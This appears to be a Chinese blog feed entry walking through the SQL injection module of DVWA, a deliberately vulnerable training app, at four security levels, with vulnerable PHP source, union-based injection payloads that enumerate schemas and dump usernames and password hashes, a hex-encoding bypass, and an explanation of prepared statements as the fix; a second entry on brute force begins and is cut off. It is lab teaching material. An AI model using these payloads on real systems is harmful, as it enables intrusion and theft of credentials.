    <title>DVWA(七)：SQL-Injection（sql注入）</title>
    <link href="https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
    <id>https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/</id>
    <published>2021-06-28T13:22:40.000Z</published>
    <updated>2022-10-20T06:18:21.166Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="SQL注入定义"><a href="#SQL注入定义" class="headerlink" title="SQL注入定义"></a>SQL注入定义</h1><p>&emsp;&emsp;SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。如Web应用程序的开发人员对用户所输入的数据或cookie等内容不进行过滤或验证(即存在注入点)就直接传输给数据库，就可能导致拼接的SQL被执行，获取对数据库的信息以及提权，发生SQL注入攻击。（来自百度百科）</p><h1 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h1><p>&emsp;&emsp;当我们在web页面中遇到用户输入框，或者url上显示了输入数据情况，怀疑存在sql注入，可以执行以下步骤：</p><ol><li>寻找注入点，确认是字符串注入还是数字注入</li><li>查询该表中字段数</li><li>查询各字段含义</li><li>找到当前数据库名称</li><li>找出数据库中的表名</li><li>找出表中字段名和字段值</li><li>写入webshell</li></ol><h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input 获取输入的id</span></span><br><span class="line">$id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check database 数据库查询语句</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get results 获取查询结果</span></span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line"><span class="comment">// Get values</span></span><br><span class="line">$first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">$last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user 显示结果</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;关键数据库查询语句如下，id传入是字符串型：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;DVWA中注入位置如下，是数据库id查询框：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/1.jpg" width="250" height="137"></div><p>&emsp;&emsp;其中$id就是用户的输入内容，可以看出，该代码并未对用户输入进行处理，而是直接拼接成sql语句执行，因此很容易注入。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;输入框输入1，显示信息是该id的First name和Surname：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/2.png" width="350" height="172"></div><p>&emsp;&emsp;输入框输入1’，测试是否有引号闭合：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/3.png"></div><p>&emsp;&emsp;提示引号错误，因为多了一个单引号，查询语句变为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = <span class="string">&#x27;1&#x27;</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;说明输入是字符串型输入，要闭合单引号。这和我们看到的代码吻合，sql查询语句中使用‘id’，输入内容被当做字符串。<br>&emsp;&emsp;闭合单引号，输入框输入1’ and 1=1#，结果如下：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/4.png" width="350" height="173"></div><p>&emsp;&emsp;该语句中1=1为永真条件，sql中#为注释符，因此原语句单引号被注释掉，不会发生错误，查询语句变为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and 1=1 #&#x27;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在mysql语句中使用order by进行查询的排序，order by后可以接字段名，也可以接字段号，如按照第一个字段排序就是order by 1。因此可以利用该特性找出表中的字段数，当order by 报错时，说明超出表中的字段数。输入1’ order by 2#，结果如下：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/5.png" width="350" height="170"></div><p>&emsp;&emsp;当我们输入1’ order by 3# 时显示：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/6.png"></div><p>&emsp;&emsp;说明该表中只有两个字段，即显示的First name和Surname。<br>&emsp;&emsp;在mysql中可以使用union联合查询多条信息，而select有一个特性，select直接加数字串时，可以不写后面的表名，那么它输出的内容就是我们select后的数字。我们利用该特性来注入，输入1’ union select 1,2#，结果如下：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/7.png" width="350" height="227"></div><p>&emsp;&emsp;如果我们替换select后面的1和2为sql语句，那么就会先执行语句再显示。mysql中可以使用database()显示当前数据库名，使用version()显示版本信息。那么我们输入：<br>&emsp;&emsp;1’ union select version(),database()#<br>&emsp;&emsp;结果如下： </p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/8.png" width="350" height="237"></div><p>&emsp;&emsp;以上都是一些比较基础和简单的信息，接下来我们需要爆出库中的表、表中的各项数据。首先需要知道mysql中有一个信息数据库 information_schema ，记录了该数据库的各种信息。<br>&emsp;&emsp;information_schema.schemata表，表中schema_name记录了数据库名称；information_schema.tables表，表中table_schema记录数据表所属的数据库名，table_name记录表名称；information_schema.columns表，表中table_name记录该列的表名，column_name 记录列名。利用这三个表可以获得数据库中的各种信息。<br>&emsp;&emsp;输入：<br>&emsp;&emsp;1’ union select 1,group_concat(schema_name) from information_schema.schemata#<br>&emsp;&emsp;获取数据库的名称：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/9.png" width="600" height="243"></div><p>&emsp;&emsp;现在知道有一个名为dvwa的数据库，输入：<br>&emsp;&emsp;1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’dvwa’#<br>&emsp;&emsp;查找属于dvwa库的表名称：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/10.png" width="600" height="197"></div><p>&emsp;&emsp;查询到dvwa数据库中有guestbook和users表，因此输入：<br>&emsp;&emsp;1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#<br>&emsp;&emsp;查询users表中的字段名称：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/11.png" width="600" height="195"></div><p>&emsp;&emsp;现在已经获取到关键字段名称，如first_name、last_name，就是正常显示的字段。其中有user、password两个字段，获取这两个字段信息，现在已经知道表名和字段名，直接查询即可，输入：<br>&emsp;&emsp;1’ union select user,password from users#<br>&emsp;&emsp;结果如下：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Low/12.png" width="350" height="407"></div><h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    <span class="comment">//mysqli_real_escape_string将x00，\n，\r，\，&#x27;，&quot;，x1a这些特殊字符转义，防SQL注入</span></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;代码和初级有所不同，在获取id传入数据后，调用mysqli_real_escape_string函数将x00，\n，\r，\，’，”，x1a这些特殊字符转义，防SQL注入。同时查询语句中id直接作为数字传入，没有单引号。<br>&emsp;&emsp;DVWA中中级显示如下，这次连输入框都没有了，通过下拉列表来实现id传入。</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/1.png" width="350" height="130"></div><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;在下拉列表中选择1，并点击Submit提交，获取到如下信息：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/2.png" width="350" height="171"></div><p>&emsp;&emsp;此时我们的url也没有发生变化，因此找不到注入点。我们通过burpsuit抓包看看：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/3.png" width="600" height="321"></div><p>&emsp;&emsp;发现Submit是通过POST方法提交的，post传入的数据为id=1&amp;Submit=Submit。因此我们可以更改post传入的id值来进行注入，使用hackbar插件，直接填充post的数据：<br>&emsp;&emsp;Submit=Submit&amp;id=1 union select 1,2</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/4.png" width="600" height="172"></div><p><br></p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/5.png" width="350" height="223"></div><p>&emsp;&emsp;剩余步骤和级别low相同，一步步找出数据库名、表名、列名，最后获得用户和密码。需要注意的是单引号等特殊字符被转义，因此不能使用，当我们需要使用’dvwa’或者’users’时，可以使用16进制来绕过：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761#      0x64767761是dvwa的16进制</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#   0x7573657273是users的16进制</span><br><span class="line">1 union select user,password from users#</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;最后结果如下：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/6.png" width="600" height="175"></div><p><br></p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/Middle/7.png" width="350" height="412"></div><h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><h2 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) or die( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;DVWA中高级显示如下，点击”here to change your ID”，页面自动跳转，防御了自动化的SQL注入。分析源码可可知，对参数没有做防御，和级别low类似。</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/High/1.png" width="350" height="95"></div><p>&emsp;&emsp;点击链接后：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/High/2.png" width="300" height="143"></div><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;在输入框中输入1’ union select 1,2#，可以直接执行，结果如下：</p><div align="center"><img src="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/High/3.png" width="350" height="217"></div><p>&emsp;&emsp;因此使用和low一样的步骤，可以依次得到数据库、表、列等数据，这里不再演示。</p><h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, <span class="attr">PDO</span>::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;impossible中使用了两处安全防护措施：</p><ol><li>Anti-CSRF token</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;使用token验证用户，防止CSRF攻击</p><ol><li>数字检查</li></ol><p>&emsp;&emsp;使用is_numeric( $id )判断输入的id是数字还是字符串，只有输入为数字才执行sql查询。</p><ol><li>sql预处理</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">$data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, <span class="attr">PDO</span>::PARAM_INT );</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;预处理和PDO会将传入的id值当做一个整体来处理，在运行时才替换参数，因此就算id中使用了引号或者sql语句，执行时会将其当做一整个字符串，不会有拼接动作，也就不能sql注入。<br>&emsp;&emsp;同时最后使用了$data-&gt;rowCount() == 1，限制查询结果为一条时才输出，有效防止信息泄露。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;近期实训在学习sql注入，因此先更新了dvwa中sql注入攻击。&lt;br&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://yiwenzhe.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="DVWA" scheme="https://yiwenzhe.com/tags/DVWA/"/>
    
    <category term="sql注入" scheme="https://yiwenzhe.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DVWA(一)：Brute Force（暴力破解）</title>
    <link href="https://yiwenzhe.com/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/"/>
    <id>https://yiwenzhe.com/2021/06/21/DVWA-%E4%B8%80-%EF%BC%9ABrute-Force%EF%BC%88%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%89/</id>
    <published>2021-06-21T15:27:02.000Z</published>
    <updated>2022-10-20T06:20:44.555Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><p>&emsp;&emsp;暴力破解是指攻击者通过穷举的方式，一一验证，直到猜出用户口令。攻击者使用的穷举文本称为密码字典，密码字典中记录了多数用户的习惯密码，如qwer、1234等简单密码。当然要获取更精确的字典，需要攻击者进行社区信息采集，收集用户信息。</p><h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users 